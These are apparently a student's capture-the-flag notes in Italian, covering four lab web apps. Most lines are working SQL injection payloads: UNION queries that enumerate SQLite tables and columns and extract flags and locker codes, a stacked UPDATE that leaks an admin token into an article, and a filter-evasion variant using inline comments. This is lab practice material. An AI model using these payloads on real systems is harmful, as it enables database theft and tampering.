airlineLostFound:
	Rossi') AND li.status = 'open') UNION ALL SELECT li.item_description, li.location_found, li.reported_at, li.status, NULL AS flight_number, NULL AS origin, NULL AS destination, NULL AS departure_date FROM lost_items li -- 
	questa query stampa tutti gli oggetti smarriti di tutti i proprietari.
	Rossi') AND li.status = 'open') UNION ALL SELECT sqlite_version(), '2', '3', '4', '5', '6', '7', '8' -- 
	Questa query ritorna la versione SQL: SQLite 3.49.2.
	Rossi') AND li.status = 'open') UNION ALL SELECT name, '2', '3', '4', '5', '6', '7', '8' FROM sqlite_master WHERE type= 'table' -- questa query stampa i nomi di tutte le tabelle nel database.
	C'e una tabella chiamata restricted items.
	Rossi') AND li.status = 'open') UNION ALL SELECT name, '2', '3', '4', '5', '6', '7', '8' FROM pragma_table_info('restricted_items') -- questa query stampa tutte le colonne di restricted_items.
	C'e una colonna chiamata locker_code.
	Rossi') AND li.status = 'open') UNION ALL SELECT locker_code, '2', '3', '4', '5', '6', '7', '8' FROM restricted_items -- questa query stampa i valori di locker_code: tra cui la flag.

departmentWiki:
	a%' OR a.content LIKE '%a%' ORDER BY a.updated_at DESC; UPDATE articles SET content = (SELECT value FROM internal_config WHERE key = 'admin_token') WHERE id = 1 -- la query non ritorna nessun output, ed e' seguita da una query non vulnerabile che invece lo ritorna. Ma viene comunque eseguita, quindi si puo' usare per cambiare il valore del contenuto dell'articolo 1 (quello sugli algoritmi), e poi leggere l'articolo normalmente.

bookBrew:
	Qualsiasi cosa venga messa come username viene poi usata in una query insocuraquando si clicca su my reviews
	prima cerco il nome di tutte le tabelle (servono 8 colonne e viene stampata a schermo la quinta, questo l'ho scoperto per tentativi)
	' OR 1=1 UNION ALL SELECT '1', '2', '3', '4', name, '6', '7', '8' FROM sqlite_master WHERE type='table'; -- questa query stampa i nomi di tutte le tabelle del db, ce n'e una chiamata secrets
	' OR 1=1 UNION ALL SELECT '1', '2', '3', '4', name, '6', '7', '8' FROM pragma_table_info('secrets'); -- questa query stampa i nomi delle colonne della tabella secrets. Una colonna e' flag
	' OR 1=1 UNION ALL SELECT '1', '2', '3', '4', flag, '6', '7', '8' FROM secrets; -- questa query stampa la flag 

stagePass: 
	''/**/Or/**/1=1/**/Union/**/All/**/Select/**/name,/**/2,/**/3/**/,/**/4/**/,/**/5,6,7,8,9,10,11,12/**/From/**/sqlite_master/**/Where/**/type='table';/**/--/**/

	''/**/Or/**/1=1/**/Union/**/All/**/Select/**/name,/**/2,/**/3/**/,/**/4/**/,/**/5,6,7,8,9,10,11,12/**/From/**/pragma_table_info('vip_guestlist');/**/--/**/
	
